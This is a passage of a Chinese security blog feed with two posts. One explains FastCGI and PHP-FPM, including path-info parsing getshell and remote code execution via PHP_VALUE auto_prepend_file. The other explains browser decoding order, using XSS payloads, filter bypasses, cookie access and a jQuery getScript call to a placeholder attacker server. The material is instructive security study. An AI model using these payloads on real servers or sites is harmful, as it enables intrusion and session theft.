<p><img src="https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p>
<p>产生漏洞最常出现的是<code>type4</code>，传递环境变量参数.下面四种把<code>body中的</code>环境参数转化为key-value形式的四种环境变量结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>

<ul>
<li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li>
<li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li>
<li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li>
<li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li>
</ul>
<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p><strong>PHP</strong>–<strong>FPM</strong>(FastCGI Process Manager：FastCGI进程管理器)是一个<strong>PHP</strong>FastCGI管理器，对于<strong>PHP</strong> 5.3.3之前的<strong>php</strong>来说，是一个补丁包 ，旨在将FastCGI进程管理整合进<strong>PHP</strong>包中。</p>
<p>也就是phpcgi传输协议中的内容是去交给PHP-FPM去解析的，解析完毕后才会去服务器上取所需数据返回给客户端。</p>
<p><strong>FPM按照fastcgi的协议将TCP流解析成真正的数据</strong></p>
<p>例如用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，对应传递的环境变量参数为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且由fpm解析后可得需要访问的文件为<code>SCRIPT_NAME</code>所指向的文件<code>/var/www/html/index.php</code>，进而从服务器取得数据返回客户端</p>
<h3 id="Nginx-IIS7解析漏洞"><a href="#Nginx-IIS7解析漏洞" class="headerlink" title="Nginx/IIS7解析漏洞"></a>Nginx/IIS7解析漏洞</h3><p>在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时会传递如下环境变量参数给FPM解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们需要先来了解一下<code>Path Info</code>模式，这是一种URL重写功能，例如如下URL <code>http://your_ip/index.php/article</code>这里的index.php并不是目录，而是使用了url重写功能来实现了更好的加载静态资源文件，而<code>fix_pathinfo</code>正属于<code>Path Info</code>下的一种产物，其作用是如果遇到了不认识的文件名会向前递归，本意是为了处理<code>http://your_ip/index.php/test</code>这种url，但是如果传递了之前的那种<code>SCRIPT_NAME</code>为<code>/favicon.ico/.php</code>的文件，就会把ico文件当作php文件来解析</p>
<p>第二种利用存在的文件名取Path Info,例如<code>http://127.0.0.1/1.jpg/1.php</code>，将<code>script_name</code>传给php-fpm来解析，<strong>fpm会将1.jpg作为php文件来解析，而将1.php作为path_info，</strong>最终getshell</p>
<h3 id="fpm任意代码执行漏洞"><a href="#fpm任意代码执行漏洞" class="headerlink" title="fpm任意代码执行漏洞"></a>fpm任意代码执行漏洞</h3><p>之前我们利用的解析漏洞所能达到的效果是执行服务器上的你想去执行的文件，但我们并不能去执行我们所需要执行的php代码，这时需要用到php的两个设置<code>auto_prepend_file</code>和<code>auto_append_file</code>.</p>
<blockquote>
<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
</blockquote>
<p>这里可以用<code>auto_prepend_file</code>和<code>php:input//</code>去getshell，将auto_prepend_file设置为php://input，这样每次运行文件都要将php://input所post的内容包含并且执行，也就是将我们所需要执行的代码放在fastcgi中的body，那么每次就可以造成RCE漏洞，注意php.ini需要allow_url_include</p>
<p>设置auto_prepend的方法：<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。传入如下环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将想要执行的代码放入body中，即可造成任意代码执行</p>
<p>P牛写的工具：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>实际上也可以通过这个生成gopher payload去打内网fastcgi</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>从浏览器渲染与解码原理重新认识xss</title>
    <url>/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在家瘫了很多天了（夹杂着一些个人感情问题</p>
<p>花了很多时间，虽然没有学习，但是理清了一些东西吧，也算是另一种收获了。</p>
<p>我可能算是一个比较感性的人吧，过去，我觉得人活的过于理性实在是太累了，所以没必要那么理性的去生活，现在反而觉得理性的活着其实是更轻松的生活态度，毕竟有些感情上的事情真的让人很难过(我似乎每天都很难过，从高二开始，真想做一个完全理性化的人啊.jpg(正在努力转变的过程)(不说了,开始正题吧</p>
<h3 id="浏览器的渲染原理"><a href="#浏览器的渲染原理" class="headerlink" title="浏览器的渲染原理"></a>浏览器的渲染原理</h3><p>目前主要的两个渲染引擎为 webkit和Gecko</p>
<p>Geoko为Firefox使用，而Chrome和Safari主要使用是Webkit</p>
<p>Webkit渲染引擎流程如下：</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/2/22/161bb3c9b220f8cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>渲染的五个步骤如下：</p>
<blockquote>
<ol>
<li>处理 HTML 标记并构建 DOM 树。</li>
<li>处理 CSS 标记并构建 CSSOM 树。</li>
<li>将 DOM 与 CSSOM 合并成一个渲染树。</li>
<li>根据渲染树来布局，以计算每个节点的几何信息。</li>
<li>将各个节点绘制到屏幕上。</li>
</ol>
</blockquote>
<h4 id="CSSOM树与DOM树的构建"><a href="#CSSOM树与DOM树的构建" class="headerlink" title="CSSOM树与DOM树的构建"></a>CSSOM树与DOM树的构建</h4><p>对于DOM树：浏览器接受HTML文档后，将遍历文档节点，生成DOM树。</p>
<p>对于CSSOM树：浏览器解析CSS文件生成CSS规则树，每个CSS文件被分析为包含着CSS规则的StyleSheet对象。</p>
<h4 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h4><p>DOM树构建过程中会收到css和javascript的阻塞，</p>
<p>在构建过程中，如果遇见js脚本则会去执行，那么就会影响DOM树构建。</p>
<p>但是css文件的优先性是大于js的优先性的</p>
<p>在浏览器解析html的时候，会把新来的元素插入dom树种，并且同时查找css，把对应的样式规则应用到元素身上。</p>
<p>所以css和js的文件放置顺序一般为：css优先，js最后。</p>
<h3 id="浏览器的解码"><a href="#浏览器的解码" class="headerlink" title="浏览器的解码"></a>浏览器的解码</h3><h4 id="浏览器的解码规则"><a href="#浏览器的解码规则" class="headerlink" title="浏览器的解码规则"></a>浏览器的解码规则</h4><ul>
<li>HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树</li>
<li>javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码</li>
<li>URL解码会根据URL所在的顺序不同而在JS解码前或者解码后</li>
</ul>
<h4 id="HTML解码器"><a href="#HTML解码器" class="headerlink" title="HTML解码器"></a>HTML解码器</h4><p>html中五类元素如下：</p>
<ol>
<li>空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li>
<li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li>
<li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li>
<li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li>
<li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li>
</ol>
<p>五类元素的特点：</p>
<ol>
<li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li>
<li>原始文本元素，可以容纳文本。</li>
<li>RCDATA元素，可以容纳文本和字符引用。</li>
<li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li>
<li>基本元素，可以容纳文本、字符引用、其他元素和注释</li>
</ol>
<h4 id="javascript解码器"><a href="#javascript解码器" class="headerlink" title="javascript解码器"></a>javascript解码器</h4><p>javascript解码器有一个特点，就是无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。</p>
<h4 id="URL解码器"><a href="#URL解码器" class="headerlink" title="URL解码器"></a>URL解码器</h4><p>对url编码后的数据进行解码，需要注意的一点是，协议不能进行编码，否则URL解码器将无法试别。</p>
<p>下面是一些例子来更好的理解着三个编码器的作用</p>
<h4 id="例子测试"><a href="#例子测试" class="headerlink" title="例子测试"></a>例子测试</h4><p>1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>URL encode “javascript:alert(1)”</p>
<p>此js代码无法执行，href属性内部为url编码的数据，所以URL解码器会进行处理，但是无法试别编码后的javascript协议，所以不会进行解码，也就无法执行。</p>
<p>在URL的规定，用户名，密码，协议都必须是ASCII。</p>
<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>前面的HTML编码数据解码为javascript，后面的URL解码为alert(2)</p>
<p>此js可以执行</p>
<p>浏览器解码流程为，先丢给HTML解码器，解码后为</p>
<p>javascript+urlencode(data)</p>
<p>此时URL解码器可以试别协议名称，所以会进行URL解码</p>
<p>最后被执行js代码</p>
<p>3.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript%3aalert(3)&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>同一，URL解码器无法识别协议名称，无法解码，最终js无法被执行。</p>
<p>4.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(4)&amp;#62;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<p>这里的<code>&amp;#60;</code>虽然会被解码为&lt;，但是无法进入标签开始状态，因为这里的<code>&amp;#60;</code>是相当于字符串的，并不是相当于真正的标签，所以alert并不会被执行。</p>
<p>5.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;textarea&gt;</code>是RCDATA元素，可以容纳文本和字符引用，也就是说textarea标签里的内容可以被html解码，但是textarea中无法容纳其他标签，js代码不会被执行。</p>
<p>6.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>

<p>和刚才是一样的，textarea标签中无法容纳其他标签。</p>
<p>7.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>HTML实体解码将<code>&amp;#39;</code>解码为’，并且前面为onclick属性，丢给js引擎处理，成功执行弹窗。</p>
<p>8.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>js中只有字符串和标识符可以用unicode来表示，所以js无法将unicode编码后的单引号解码，所以无法执行此js脚本</p>
<p>9.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>script标签无法容纳字符引用，所以无法进行HTML解码，直接交给js来处理，无法执行此代码</p>
<p>10.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前五个字符js解码后为alert标识符，而js是可以解码标识符的，所以可以成功执行js</p>
<p>11.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>有括号，无法试别控制字符，无法执行</p>
<p>12.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这个挺有趣的，\u0031\u0032被翻译为12，不过这个12是字符串类型的，并非数字类型的，需要引号，这里没有引号，无法执行。</p>
<p>13.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;14\u000a&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>\u000a为换行字符，可以只执行</p>
<p>14.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>第一步解码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br></pre></td></tr></table></figure>

<p>URL解码器可试别，交给URL解码器处理，第二步解码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br></pre></td></tr></table></figure>

<p>最后由js解码器解码，然后执行js</p>
<p>从上面的例子我们可以看出几个关键点：</p>
<p>1.js解码器只会对字符串和标识符进行js解码</p>
<p>2.RCDATA元素(textarea)，可以容纳实体引用，也就是可以进行HTML解码操作，但其实子元素是无法执行的</p>
<p>3.URL解码需要进行协议识别后才能进行解码</p>
<p>4.原始文本元素中无法进行URL解码和HTML解码</p>
<h4 id="实战例子"><a href="#实战例子" class="headerlink" title="实战例子"></a>实战例子</h4><h5 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h5><p>这个例子选取了Wooyun中的一个例子</p>
<p>漏洞点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:location&#x3D;&#39;.&#x2F;3.3.php?offset&#x3D;&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;&#39;&quot;&gt;GO&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>我们输入的searchvalue_yjbg参数会随着这个a标签一起插入到页面源码中</p>
<p>首先页面是对单引号进行了过滤，我们无法执行输入单引号去进行闭合，但是我们可以输入进行HTML编码后的单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wooyun%26%23x27,alert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure>

<p>解析过程为：首先进行HTML解码，将这些HTML编码解析为对应的字符串，此时他并不会进行闭合，只有在执行js代码的时候，js引擎将这些字符串再一遍解析，而这个之前被当作字符串的单引号就起到了闭合的作用，最终执行了我们的自定义的js代码，像这样的例子还有一些，我们接着来举一些。</p>
<h5 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src &#x3D; &quot;https:&#x2F;&#x2F;text.com&quot; onclick &#x3D; &#39;alert(&quot;输入点&quot;)&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>在过滤掉单引号的情况下我们可以通过实体编码的方式进行Bypass，解析的流程也和之前的一样，先进行HTML解码将我们的闭合双引号解析为字符串，再在js引擎处理这段js代码的过程中产生闭合注入</p>
<h5 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h5><p>这个是先知文章中的一个例子，感觉蛮经典的，拿来引用一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a onclick&#x3D;&quot;window.open(&#39;value1&#39;)&quot; href&#x3D;&quot;javascript:window.open(value2)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>对于value1: 先进行HTML解码，由于onclick再进行js解码，最后由于window.open函数进行URL解码。</p>
<p>对于value2，先HTML解码，由于href属性进行一次URL解码，由于javascript协议，进行js解码，最后由于window.open再URL解码，所以在这个例子中一共进行了两次URL解码。</p>
<h4 id="新增的HTML5实体编码带来的安全问题"><a href="#新增的HTML5实体编码带来的安全问题" class="headerlink" title="新增的HTML5实体编码带来的安全问题"></a>新增的HTML5实体编码带来的安全问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;colon; 冒号</span><br><span class="line">&amp;NewLine; 换行</span><br></pre></td></tr></table></figure>

<p>Bypass Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>HTML解码后，即可执行</p>
<h4 id="浏览器的词法分析器"><a href="#浏览器的词法分析器" class="headerlink" title="浏览器的词法分析器"></a>浏览器的词法分析器</h4><p>对于下面JS的执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc</span><br><span class="line">ript:alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器中的解析器中词法分析器起的作用会跳过空白跟换行之类的无效字符</p>
<p>onerror=的换行Bypass也是利用了这个词法分析器进行实现的</p>
<h3 id="XSS的一些技巧"><a href="#XSS的一些技巧" class="headerlink" title="XSS的一些技巧"></a>XSS的一些技巧</h3><p>通过top,windows对象来Bypass某些关键词</p>
<p>详细的看这篇文章好了</p>
<p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185</a></p>
<h3 id="JavaScript全局变量绕过XSS过滤器"><a href="#JavaScript全局变量绕过XSS过滤器" class="headerlink" title="JavaScript全局变量绕过XSS过滤器"></a>JavaScript全局变量绕过XSS过滤器</h3><p>举几个例子就可以懂了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">self[&quot;\x61\x6c\x65\x72\x74&quot;](</span><br><span class="line">    self[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;]</span><br><span class="line">        [&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这里的self可以被如下代替：</p>
<p>• window</p>
<p>• self</p>
<p>• _self</p>
<p>• this</p>
<p>• top</p>
<p>• parent</p>
<p>• frames</p>
<h4 id="jQuery的变异"><a href="#jQuery的变异" class="headerlink" title="jQuery的变异"></a>jQuery的变异</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</span><br><span class="line">&#x2F;&#x2F;这里我也可以变异的很复杂</span><br><span class="line">self[&quot;$&quot;][&quot;getScript&quot;](&quot;Your_vps&quot;);</span><br><span class="line">&#x2F;&#x2F;加载远程脚本</span><br></pre></td></tr></table></figure>

<h4 id="Object迭代"><a href="#Object迭代" class="headerlink" title="Object迭代"></a>Object迭代</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Object.keys(self)[145]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[145]](&quot;foo&quot;) &#x2F;&#x2F; alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/1bsdcF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/12/1bsdcF.png" alt="1bsdcF.png"></a></p>
<p>首先通过迭代遍历出alert或者其他想要获得函数的位置</p>
